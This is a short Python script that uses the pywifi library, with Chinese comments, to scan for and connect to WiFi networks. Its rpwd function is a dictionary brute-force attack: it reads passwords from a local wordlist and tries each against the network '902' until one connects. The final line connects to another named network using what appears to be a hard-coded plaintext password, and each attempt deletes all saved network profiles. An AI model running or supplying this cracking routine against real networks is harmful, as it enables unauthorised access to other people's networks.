import pywifi
from pywifi import const
import time

wifi = pywifi.PyWiFi()#创建一个无线对象
ifaces = wifi.interfaces()[0]
#print (ifaces.name())#网卡名字
#print (ifaces.status())#连接状态
def iswificonnect():
    global wifi,ifaces
    if ifaces.status() == const.IFACE_DISCONNECTED:
        print ('WiFi未连接')
    else:
        print ('WiFi已连接')   

def scan():
    global wifi,ifaces
    ifaces.scan()
    bessis = ifaces.scan_results()#扫描结果
    #print (bessis)
    for wifi in bessis:
        print (wifi.ssid)#wifi名

def wifidisconnect(name,pwd):
    global wifi,ifaces
    ifaces.disconnect()
    #time.sleep(1)
    if ifaces.status() == const.IFACE_DISCONNECTED:
        print ("disconnect succeed")
        profile = pywifi.Profile()#连接文件
        profile.ssid = name
        profile.key = pwd
        profile.akm.append(const.AKM_TYPE_WPA2PSK)#加密算法
        profile.auth = const.AUTH_ALG_OPEN#网卡开发
        profile.cipher = const.CIPHER_TYPE_CCMP#加密单元
        #删除所有wifi文件
        ifaces.remove_all_network_profiles()
        #设定新的连接文件
        temp_profile = ifaces.add_network_profile(profile)
        #连接wifi
        ifaces.connect(temp_profile)
        time.sleep(3)
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False

def rpwd():
    print ("start try password")
    book = r"D:\Cpanku\Desktop\paswwer2.txt"
    with open (book,'r') as f:
        while True:
            try:
                pwd = f.readline()
                isc = wifidisconnect('902', pwd)
                if isc:
                    print ('try password succeedful')
                    print ('password:' + pwd)
                    break
                else:
                    print ('try password fail:' + pwd)
            except:
                continue


print (wifidisconnect("TP-LINK_71F2",'lh15014098619'))
#rpwd()

